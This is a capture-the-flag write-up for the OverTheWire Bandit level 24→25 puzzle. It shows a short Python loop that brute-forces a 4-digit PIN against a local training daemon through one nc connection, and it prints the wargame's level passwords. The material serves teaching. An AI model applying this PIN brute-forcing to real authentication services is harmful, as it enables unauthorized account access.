# Bandit Level 24 → 25 Writeup

## Goal

> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
> You do not need to create new connections each time

## Solution

This level gives us a service on `localhost:30002`. It requires the `bandit24` password and a 4-digit PIN, so I just need to brute-force all values from `0000` to `9999`.

First, I checked whether Python was available:

```bash
bandit24@bandit:~$ which python3
/usr/bin/python3
```

Then I created a temporary working directory:

```bash
bandit24@bandit:~$ mktemp -d
/tmp/tmp.sQkwv7ACz0
bandit24@bandit:~$ cd /tmp/tmp.sQkwv7ACz0
```

I then wrote a small Python script to generate every possible input. The `:04d` format keeps the PIN as 4 digits, so `1` becomes `0001`:

```python
bandit24_password = "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
for pincode in range(0, 10000):
    print(f"{bandit24_password} {pincode:04d}")
```

After that, I sent all generated lines through one `nc` connection and filtered out the wrong attempts:

```bash
bandit24@bandit:/tmp/tmp.sQkwv7ACz0$ python3 exploit.py | nc localhost 30002 |  grep -v "Wrong"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

When the correct PIN was reached, the service returned the next password.

## Password

```text
SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```
